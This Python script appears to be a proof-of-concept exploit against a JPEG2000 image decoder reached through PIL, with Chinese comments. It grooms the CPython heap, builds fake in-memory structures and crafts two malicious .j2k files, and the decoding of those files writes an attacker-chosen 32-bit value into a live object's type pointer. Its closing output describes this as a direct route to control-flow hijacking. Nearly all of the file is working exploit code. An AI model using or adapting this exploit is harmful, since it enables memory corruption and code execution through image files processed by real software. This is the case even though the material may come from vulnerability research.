#!/usr/bin/env python3
# 终局验证：多段写 ⇒ 把【任意 32 位值】写进活对象的 ob_type
#   目标值 0xa21690（PyByteArray_Type），两段：
#     段1: data=victim+8  样本[0x1690] => 字节 90 16 00 00 ...
#     段2: data=victim+0xa 样本[0x00a2] => 字节 a2 00 00 00 ...
#   => victim+8 = 90 16 a2 00 00 00 00 00 = 0xa21690 ✓
import ctypes, gc, io, os, struct, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
TARGETV = 0x0000A21690


def put64(a, v):
    ctypes.c_uint64.from_address(a).value = v & 0xFFFFFFFFFFFFFFFF


def mkpayload(path, samples):
    im = Image.new('I;16', (len(samples), 1))
    im.putdata(list(samples))
    im.save(path, 'JPEG2000')


def mkfake(target, res_addr):
    buf = bytearray(1024)
    fa = ctypes.addressof((ctypes.c_char * 1024).from_buffer(buf))
    put64(fa + 0x10, 1)
    put64(fa + 0x18, 1)
    put64(fa + 0x20, res_addr)
    put64(fa + 0x28, 40)
    put64(fa + 0x30, target)
    put64(fa + 0x38, 0)
    put64(fa + 0x40, 4096)
    put64(fa + 0x48, 4096)
    return buf, fa


def groom_and_decode(path, tries=6):
    for _ in range(tries):
        gc.collect()
        prime = [bytes(519) for _ in range(1024)]
        del prime
        pairs = [(bytes(519), bytes(bytearray(519))) for _ in range(400)]
        good = [(D, B) for (D, B) in pairs if id(B) - id(D) == 0x230]
        if not good:
            del pairs
            continue
        ng = len(good)
        keep = [t2 for i, t2 in enumerate(good) if i != len(good) // 2]
        Ks2 = [B for (D, B) in keep]
        holeD = good[len(good) // 2][0]
        del holeD, pairs, good
        gc.collect()
        M = open(path, 'rb').read()
        try:
            im = Image.open(io.BytesIO(M)); im.load()
            return (im.size, ng)
        except BaseException as e:
            return ("ERR %r" % (e,), ng)
    return (None, 0)


victim = bytes(bytearray(1024))
VADDR = id(victim)
print("[*] victim=%#x  +8=%#x" % (VADDR, R(VADDR + 8)))

res_buf = bytearray(512)
RESADDR = ctypes.addressof((ctypes.c_char * 512).from_buffer(res_buf))
put64(RESADDR + 0x08, 16)
put64(RESADDR + 0x0c, 16)
put64(RESADDR + 0x10, 1)
put64(RESADDR + 0x14, 1)

mkpayload('/tmp/payA.j2k', [TARGETV & 0xFFFF])                 # 0x1690
mkpayload('/tmp/payB.j2k', [(TARGETV >> 16) & 0xFFFF])         # 0x00a2

for stage, (pay, off) in enumerate([('/tmp/payA.j2k', 0), ('/tmp/payB.j2k', 2)], 1):
    fake_buf, FAKE = mkfake(VADDR + 8 + off, RESADDR)
    A = FAKE - 0x0c
    B = A + 0x1000
    C = A + 0x4000
    r = subprocess.run(['python3', '/tmp/mk13t.py', pay, '/tmp/F.j2k', '0', '23',
                        hex(A), hex(B), hex(C), '-370'], capture_output=True, text=True)
    if 'OK' not in r.stdout:
        print("段%d build 失败: %s" % (stage, (r.stdout + r.stderr)[:70])); sys.exit(1)
    res, ng = groom_and_decode('/tmp/F.j2k')
    print("[*] 段%d: data=%#x 解码=%s 相邻对=%d  现在 +8=%#x"
          % (stage, VADDR + 8 + off, res, ng, R(VADDR + 8)))

print()
print("[*] 原始字节:", ctypes.string_at(VADDR, 24).hex())
print("[*] 最终 +8 = %#x   期望 %#x" % (R(VADDR + 8), TARGETV))
if R(VADDR + 8) == TARGETV:
    try:
        t = type(victim)
    except BaseException as e:
        t = "ERR %r" % (e,)
    print("[*] type(victim) =", t)
    print("\n★★★ 多段写成立：解码器把【任意 32 位值】写进了活对象的 ob_type")
    print("    => 任意字段/任意值 ⇒ 控制流改写的直接入口")